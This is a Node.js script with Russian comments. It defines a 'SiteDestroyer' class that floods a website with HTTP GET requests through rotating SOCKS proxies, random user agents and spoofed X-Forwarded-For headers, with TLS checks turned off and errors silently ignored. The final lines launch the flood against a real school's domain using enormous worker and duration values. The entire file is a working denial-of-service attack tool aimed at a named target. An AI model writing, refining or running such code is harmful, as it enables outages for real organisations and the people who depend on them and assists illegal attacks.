const http = require('http');  
const https = require('https');  
const URL = require('url');  
const { SocksProxyAgent } = require('socks-proxy-agent');  
const randomUA = require('random-useragent');  

class SiteDestroyer {  
  constructor(target, options = {}) {  
    this.target = URL.parse(target);  
    this.proxies = options.proxies || [];  
    this.workers = options.workers || 500;  
    this.duration = options.duration || 60000;  

    // Фикс контекста  
    this.getRandomProxy = this.getRandomProxy.bind(this);  
    this.attack = this.attack.bind(this);  
  }  

  getRandomProxy() {  
    return this.proxies.length  
      ? this.proxies[Math.floor(Math.random() * this.proxies.length)]  
      : null;  
  }  

  generateHeaders() {  
    return {  
      'User-Agent': randomUA.getRandom(),  
      'Accept-Language': 'en-US,en;q=0.9',  
      'X-Forwarded-For': Array.from({length:4}, () => Math.floor(Math.random()*255)).join('.')  
    };  
  }  

  async attack() {  
    try {  
      const proxy = this.getRandomProxy();  
      const agent = proxy ? new SocksProxyAgent(proxy) : null;  

      const req = (this.target.protocol === 'https:' ? https : http).request({  
        hostname: this.target.hostname,  
        port: this.target.port || (this.target.protocol === 'https:' ? 443 : 80),  
        path: this.target.path,  
        method: 'GET',  
        headers: this.generateHeaders(),  
        agent,  
        rejectUnauthorized: false  
      });  

      req.on('error', () => {});  
      req.end();  

    } catch(e) { /* Игнорируем все ошибки */ }  
  }  

  start() {  
    console.log(`[+] Атака начата: ${this.target.href}`);  
    for(let i = 0; i < this.workers; i++) {  
      setInterval(this.attack, 10);  
    }  
    setTimeout(() => {  
      console.log('[+] Атака завершена');  
      process.exit(0);  
    }, this.duration);  
  }  
}  

// Запуск  
new SiteDestroyer('https://oxbridgeschool.uz/', {  
  proxies: ['socks5://user:pass@proxy1:1080'],  
  workers: 10000000000000,  
  duration: 3000000000  
}).start();  
